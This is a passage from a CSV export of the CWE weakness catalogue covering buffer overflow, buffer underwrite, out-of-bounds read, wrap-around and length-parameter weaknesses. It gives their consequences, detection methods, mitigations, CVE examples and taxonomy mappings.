ID:1340:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:123:VIEW ID:1000::NATURE:ChildOf:CWE ID:20:VIEW ID:700:ORDINAL:Primary::,\"::ORDINALITY:Resultant::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Assembly:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:Classic Buffer Overflow:DESCRIPTION:This term was frequently used by vulnerability researchers during approximately 1995 to 2005 to differentiate buffer copies without length checks (which had been known about for decades) from other emerging weaknesses that still involved invalid accesses of buffers, as vulnerability researchers began to develop advanced exploitation techniques.::TERM:Unbounded Transfer::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:NOTE:Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of the product's implicit security policy. This can often be used to subvert any other security service.::SCOPE:Availability:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):NOTE:Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the product into an infinite loop.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.:EFFECTIVENESS:High::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.::METHOD:Manual Analysis:DESCRIPTION:Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer. Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:DESCRIPTION:Consider adhering to the following rules when allocating and managing an application's memory: Double check that your buffer is as large as you specify. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space. If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Operation Build and Compilation:STRATEGY:Environment Hardening:DESCRIPTION:Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as rebasing (for Windows) and prelinking (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335].:EFFECTIVENESS:Defense in Depth::PHASE:Operation:STRATEGY:Environment Hardening:DESCRIPTION:Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336].:EFFECTIVENESS:Defense in Depth::PHASE:Build and Compilation Operation:DESCRIPTION:Most mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution.::PHASE:Implementation:DESCRIPTION:Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Architecture and Design Operation:STRATEGY:Sandbox or Jail:DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.:EFFECTIVENESS:Limited::\",\"::REFERENCE:CVE-2000-1094:DESCRIPTION:buffer overflow using command with long argument:LINK:https://www.cve.org/CVERecord?id=CVE-2000-1094::REFERENCE:CVE-1999-0046:DESCRIPTION:buffer overflow in local program using long environment variable:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0046::REFERENCE:CVE-2002-1337:DESCRIPTION:buffer overflow in comment characters, when product increments a counter for a > but does not decrement for <:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1337::REFERENCE:CVE-2003-0595:DESCRIPTION:By replacing a valid cookie value with an extremely long string of characters, an attacker may overflow the application's buffers.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0595::REFERENCE:CVE-2001-0191:DESCRIPTION:By replacing a valid cookie value with an extremely long string of characters, an attacker may overflow the application's buffers.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0191::\",::Memory Management::,::Memory::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Unbounded Transfer ('classic overflow')::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Buffer Overflow::TAXONOMY NAME:CLASP:ENTRY NAME:Buffer overflow::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A5:ENTRY NAME:Buffer Overflows:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR31-C:ENTRY NAME:Guarantee that storage for strings has sufficient space for character data and the null terminator:MAPPING FIT:Exact::TAXONOMY NAME:WASC:ENTRY ID:7:ENTRY NAME:Buffer Overflow::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP8:ENTRY NAME:Faulty Buffer Access::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-120::TAXONOMY NAME:OMG ASCRM:ENTRY ID:ASCRM-CWE-120::\",::10::100::14::24::42::44::45::46::47::67::8::9::92::,\"::TYPE:Relationship:NOTE:At the code level, stack-based and heap-based overflows do not differ significantly, so there usually is not a need to distinguish them. From the attacker perspective, they can be quite different, since different techniques are required to exploit them.::TYPE:Terminology:NOTE:Many issues that are now called buffer overflows are substantively different than the classic overflow, including entirely different bug types that rely on overflow exploit techniques, such as integer signedness errors, integer overflows, and format string bugs. This imprecise terminology can make it difficult to determine which variant is being reported.::\",\n124,\"Buffer Underwrite ('Buffer Underflow')\",Base,Incomplete,\"The product writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.\",\"This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.\",::NATURE:ChildOf:CWE ID:786:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:787:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:buffer underrun:DESCRIPTION:Some prominent vendors and researchers use the term buffer underrun. Buffer underflow is more commonly used, although both terms are also sometimes used to describe a buffer under-read (CWE-127).::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:NOTE:Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:SCOPE:Other:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Modify Memory:IMPACT:Bypass Protection Mechanism:IMPACT:Other:NOTE:If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code. If the corrupted memory is data rather than instructions, the system will continue to function with improper changes, possibly in violation of an implicit or explicit policy. The consequences would only be limited by how the affected data is used, such as an adjacent memory location that is used to specify whether the user has special privileges.::SCOPE:Access Control:SCOPE:Other:IMPACT:Bypass Protection Mechanism:IMPACT:Other:NOTE:When the consequence is arbitrary code execution, this can often be used to subvert any other security service.::\",\"\",\"::PHASE:Requirements:DESCRIPTION:Choose a language that is not susceptible to these issues.::PHASE:Implementation:DESCRIPTION:All calculated values that are used as index or for pointer arithmetic should be validated to ensure that they are within an expected range.::\",\"::REFERENCE:CVE-2021-24018:DESCRIPTION:buffer underwrite in firmware verification routine allows code execution via a crafted firmware image:LINK:https://www.cve.org/CVERecord?id=CVE-2021-24018::REFERENCE:CVE-2002-2227:DESCRIPTION:Unchecked length of SSLv2 challenge value leads to buffer underflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-2227::REFERENCE:CVE-2007-4580:DESCRIPTION:Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130):LINK:https://www.cve.org/CVERecord?id=CVE-2007-4580::REFERENCE:CVE-2007-1584:DESCRIPTION:Buffer underflow from an all-whitespace string, which causes a counter to be decremented before the buffer while looking for a non-whitespace character.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1584::REFERENCE:CVE-2007-0886:DESCRIPTION:Buffer underflow resultant from encoded data that triggers an integer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-0886::REFERENCE:CVE-2006-6171:DESCRIPTION:Product sets an incorrect buffer size limit, leading to off-by-two buffer underflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6171::REFERENCE:CVE-2006-4024:DESCRIPTION:Negative value is used in a memcpy() operation, leading to buffer underflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4024::REFERENCE:CVE-2004-2620:DESCRIPTION:Buffer underflow due to mishandled special characters:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2620::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:UNDER - Boundary beginning violation ('buffer underflow'?)::TAXONOMY NAME:CLASP:ENTRY NAME:Buffer underwrite::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP8:ENTRY NAME:Faulty Buffer Access::\",,\"::TYPE:Relationship:NOTE:This could be resultant from several errors, including a bad offset or an array index that decrements before the beginning of the buffer (see CWE-129).::\",\n125,\"Out-of-bounds Read\",Base,Draft,\"The product reads data past the end, or before the beginning, of the intended buffer.\",\"\",::NATURE:ChildOf:CWE ID:119:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::,\"::ORDINALITY:Resultant:DESCRIPTION:When an out-of-bounds read occurs, typically the product has already made a separate mistake, such as modifying an index or performing pointer arithmetic that produces an out-of-bounds address.::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::,\"\",\"::TERM:OOB read:DESCRIPTION:Shorthand for Out of bounds read::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:NOTE:An attacker could get secret values such as cryptographic keys, PII, memory addresses, or other information that could be used in additional attacks.::SCOPE:Confidentiality:IMPACT:Bypass Protection Mechanism:NOTE:Out-of-bounds memory could contain memory addresses or other information that can be used to bypass ASLR and other protection mechanisms in order to improve the reliability of exploiting a separate weakness for code execution.::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:An attacker could cause a segmentation fault or crash by causing memory to be read outside of the bounds of the buffer. This is especially likely when the code reads a variable amount of data and assumes that a sentinel exists to stop the read operation, such as a NUL in a string.::SCOPE:Other:IMPACT:Varies by Context:NOTE:The read operation could produce other undefined or unexpected results.::\",\"::METHOD:Fuzzing:DESCRIPTION:Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. To reduce the likelihood of introducing an out-of-bounds read, ensure that you validate and ensure correct calculations for any length argument, buffer size calculation, or offset. Be especially careful of relying on a sentinel (i.e. special character such as NUL) in untrusted inputs.::PHASE:Architecture and Design:STRATEGY:Language Selection:DESCRIPTION:Use a language that provides appropriate memory abstractions.::\",\"::REFERENCE:CVE-2020-11899:DESCRIPTION:Out-of-bounds read in IP stack used in embedded systems, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-11899::REFERENCE:CVE-2014-0160:DESCRIPTION:Chain: Heartbleed bug receives an inconsistent length parameter (CWE-130) enabling an out-of-bounds read (CWE-126), returning memory that could include private cryptographic keys and other sensitive data.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-0160::REFERENCE:CVE-2021-40985:DESCRIPTION:HTML conversion package has a buffer under-read, allowing a crash:LINK:https://www.cve.org/CVERecord?id=CVE-2021-40985::REFERENCE:CVE-2018-10887:DESCRIPTION:Chain: unexpected sign extension (CWE-194) leads to integer overflow (CWE-190), causing an out-of-bounds read (CWE-125):LINK:https://www.cve.org/CVERecord?id=CVE-2018-10887::REFERENCE:CVE-2009-2523:DESCRIPTION:Chain: product does not handle when an input string is not NULL terminated (CWE-170), leading to buffer over-read (CWE-125) or heap-based buffer overflow (CWE-122).:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2523::REFERENCE:CVE-2018-16069:DESCRIPTION:Chain: series of floating-point precision errors (CWE-1339) in a web browser rendering engine causes out-of-bounds read (CWE-125), giving access to cross-origin data:LINK:https://www.cve.org/CVERecord?id=CVE-2018-16069::REFERENCE:CVE-2004-0112:DESCRIPTION:out-of-bounds read due to improper length check:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0112::REFERENCE:CVE-2004-0183:DESCRIPTION:packet with large number of specified elements cause out-of-bounds read.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0183::REFERENCE:CVE-2004-0221:DESCRIPTION:packet with large number of specified elements cause out-of-bounds read.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0221::REFERENCE:CVE-2004-0184:DESCRIPTION:out-of-bounds read, resultant from integer underflow:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0184::REFERENCE:CVE-2004-1940:DESCRIPTION:large length value causes out-of-bounds read:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1940::REFERENCE:CVE-2004-0421:DESCRIPTION:malformed image causes out-of-bounds read:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0421::REFERENCE:CVE-2008-4113:DESCRIPTION:OS kernel trusts userland-supplied length value, allowing reading of sensitive information:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4113::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Out-of-bounds Read::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ARR30-C:ENTRY NAME:Do not form or use out-of-bounds pointers or array subscripts:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ARR38-C:ENTRY NAME:Guarantee that library functions do not form invalid pointers:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:EXP39-C:ENTRY NAME:Do not access a variable through a pointer of an incompatible type:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR31-C:ENTRY NAME:Guarantee that storage for strings has sufficient space for character data and the null terminator:MAPPING FIT:Imprecise::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR32-C:ENTRY NAME:Do not pass a non-null-terminated character sequence to a library function that expects a string:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP8:ENTRY NAME:Faulty Buffer Access::\",::540::,\"\",\n128,\"Wrap-around Error\",Base,Incomplete,\"Wrap around errors occur whenever a value is incremented past the maximum value for its type and therefore wraps around to a very small, negative, or undefined value.\",\"\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::NATURE:PeerOf:CWE ID:190:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Often::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Often::,\"::Due to how addition is performed by computers, if a primitive is incremented past the maximum value possible for its storage space, the system will not recognize this, and therefore increment each bit as if it still had extra space. Because of how negative numbers are represented in binary, primitives interpreted as signed may wrap to very large negative values.::\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:DoS: Resource Consumption (CPU):IMPACT:DoS: Resource Consumption (Memory):IMPACT:DoS: Instability:NOTE:This weakness will generally lead to undefined behavior and therefore crashes. In the case of overflows involving loop index variables, the likelihood of infinite loops is also high.::SCOPE:Integrity:IMPACT:Modify Memory:NOTE:If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.::SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:NOTE:This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a program's implicit security policy.::\",\"\",\"::PHASE::DESCRIPTION:Requirements specification: The choice could be made to use a language that is not susceptible to these issues.::PHASE:Architecture and Design:DESCRIPTION:Provide clear upper and lower bounds on the scale of any protocols designed.::PHASE:Implementation:DESCRIPTION:Perform validation on all incremented variables to ensure that they remain within reasonable bounds.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Wrap-around error::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:MEM07-C:ENTRY NAME:Ensure that the arguments to calloc(), when multiplied, can be represented as a size_t::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP1:ENTRY NAME:Glitch in computation::\",::92::,\"::TYPE:Relationship:NOTE:The relationship between overflow and wrap-around needs to be examined more closely, since several entries (including CWE-190) are closely related.::\",\n130,\"Improper Handling of Length Parameter Inconsistency\",Base,Incomplete,\"The product parses a formatted message or structure, but it does not handle or incorrectly handles a length field that is inconsistent with the actual length of the associated data.\",\"If an attacker can manipulate the length parameter associated with an input such that it is inconsistent with the actual length of the input, this can be leveraged to cause the target application to behave in unexpected, and possibly, malicious ways. One of the possible motives for doing so is to pass in arbitrarily large input to the application. Another possible motivation is the modification of application state by including invalid data for subsequent properties of the application. Such weaknesses commonly lead to attacks such as buffer overflows and execution of arbitrary code.\",::NATURE:ChildOf:CWE ID:240:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:119:VIEW ID:1340:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:805:VIEW ID:1000::,\"::ORDINALITY:Primary::\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Sometimes::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:length manipulation::TERM:length tampering::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Read Memory:IMPACT:Modify Memory:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:DESCRIPTION:When processing structured incoming data containing a size field followed by raw data, ensure that you identify and resolve any inconsistencies between the size field and the actual size of the data.::PHASE:Implementation:DESCRIPTION:Do not let the user control the size of the buffer.::PHASE:Implementation:DESCRIPTION:Validate that the length of the user-supplied data is consistent with the buffer size.::\",\"::REFERENCE:CVE-2014-0160:DESCRIPTION:Chain: Heartbleed bug receives an inconsistent length parameter (CWE-130) enabling an out-of-bounds read (CWE-126), returning memory that could include private cryptographic keys and other sensitive data.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-0160::REFERENCE:CVE-2009-2299:DESCRIPTION:Web application firewall consumes excessive memory when an HTTP request contains a large Content-Length value but no POST data.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2299::REFERENCE:CVE-2001-0825:DESCRIPTION:Buffer overflow in internal string handling routine allows remote attackers to execute arbitrary commands via a length argument of zero or less, which disables the length check.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0825::REFERENCE:CVE-2001-1186:DESCRIPTION:Web server allows remote attackers to cause a denial of service via an HTTP request with a content-length value that is larger than the size of the request, which prevents server from timing out the connection.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1186::REFERENCE:CVE-2001-0191:DESCRIPTION:Service does not properly check the specified length of a cookie, which allows remote attackers to execute arbitrary commands via a buffer overflow, or brute force authentication by using a short cookie length.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0191::REFERENCE:CVE-2003-0429:DESCRIPTION:Traffic analyzer allows remote attackers to cause a denial of service and possibly execute arbitrary code via invalid IPv4 or IPv6 prefix lengths, possibly triggering a buffer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0429::REFERENCE:CVE-2000-0655:DESCRIPTION:Chat client allows remote attackers to cause a denial of service or execute arbitrary commands via a JPEG image containing a comment with an illegal field length of 1.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0655::REFERENCE:CVE-2004-0492:DESCRIPTION:Server allows remote attackers to cause a denial of service and possibly execute arbitrary code via a negative Content-Length HTTP header field causing a heap-based buffer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0492::REFERENCE:CVE-2004-0201:DESCRIPTION:Help program allows remote attackers to execute arbitrary commands via a heap-based buffer overflow caused by a .CHM file with a large length field:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0201::REFERENCE:CVE-2003-0825:DESCRIPTION:Name services does not properly validate the length of certain packets, which allows attackers to cause a denial of service and possibly execute arbitrary code. Can overlap zero-length issues:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0825::REFERENCE:CVE-2004-0095:DESCRIPTION:Policy manager allows remote attackers to cause a denial of service (memory consumption and crash) and possibly execute arbitrary code via an HTTP POST request with an invalid Content-Length value.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0095::REFERENCE:CVE-2004-0826:DESCRIPTION:Heap-based buffer overflow in library allows remote attackers to execute arbitrary code via a modified record length field in an SSLv2 client hello message.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0826::REFERENCE:CVE-2004-0808:DESCRIPTION:When domain logons are enabled, server allows remote attackers to cause a denial of service via a SAM_UAS_CHANGE request with a length value that is larger than the number of structures that are provided.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0808::REFERENCE:CVE-2002-1357:DESCRIPTION:Multiple SSH2 servers and clients do not properly handle packets or data elements with incorrect length specifiers, which may allow remote attackers to cause a denial of service or possibly execute arbitrary code.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1357::REFERENCE:CVE-2004-0774:DESCRIPTION:Server allows remote attackers to cause a denial of service (CPU and memory exhaustion) via a POST request with a Content-Length header set to -1.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0774::REFERENCE:CVE-2004-0989:DESCRIPTION:Multiple buffer overflows in xml library that may allow remote attackers to execute arbitrary code via long URLs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0989::REFERENCE:CVE-2004-0568:DESCRIPTION:Application does not properly validate the length of a value that is saved in a session file, which allows remote attackers to execute arbitrary code via a malicious session file (.ht), web site, or Telnet URL contained in an e-mail message, triggering a buffer overflow.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0568::REFERENCE:CVE-2003-0327:DESCRIPTION:Server allows remote attackers to cause a denial of service via a remote password array with an invalid length, which triggers a heap-based buffer 